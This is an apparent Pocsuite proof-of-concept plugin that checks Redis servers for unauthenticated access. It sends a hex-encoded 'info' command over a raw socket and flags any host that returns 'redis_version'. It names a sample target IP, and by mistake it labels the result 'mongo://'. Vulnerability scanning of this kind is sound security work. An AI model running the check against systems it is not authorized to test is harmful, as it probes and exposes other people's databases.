#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
reload(sys)
sys.setdefaultencoding('utf8')
import socket
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class TestPOC(POCBase):
    vulID = '00002'
    version = '1.0'
    author = 'TideSec'
    vulDate = '2017-08-15'
    createDate = '2017-08-15'
    updateDate = '2017-08-15'
    references = ['http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/']
    name = 'Redis Unauthorized'
    appPowerLink = 'https://www.redis.io'
    appName = 'Redis'
    appVersion = 'All'
    vulType = 'Unauthorized'
    desc = 'Redis 默认没有开启相关认证, 黑客直接访问即可获取数据库中所有信息.'
    samples = ['128.36.23.111']
    defaultPorts = [6379]
    defaultService = ['Redis key-value store', 'redis']

    def parse_target(self, target, default_port):
        schema = 'http'
        port = default_port
        address = ''
        if '://' in target:
            slices = target.split('://')
            schema = slices[0]
            target = slices[1]
        if ':' in target:
            slices = target.split(':')
            address = slices[0]
            port = slices[1]
        else:
            address = target
        return {'schema': schema, 'address': address, 'port': int(port)}

    def _verify(self):
        result = {}
        payload = '\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
        s = socket.socket()
        socket.setdefaulttimeout(4)
        try:
            target = self.parse_target(self.target, 6379)
            s.connect((target['address'], target['port']))
            s.send(payload)
            data = s.recv(1024)
            if data and 'redis_version' in data:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = "mongo://{}:{}".format(target['address'], target['port'])
                result['VerifyInfo']['Payload'] = payload
                result['VerifyInfo']['Result'] = data
        except Exception as e:
            print e
        s.close()
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail("someting error")
        return output


register(TestPOC)
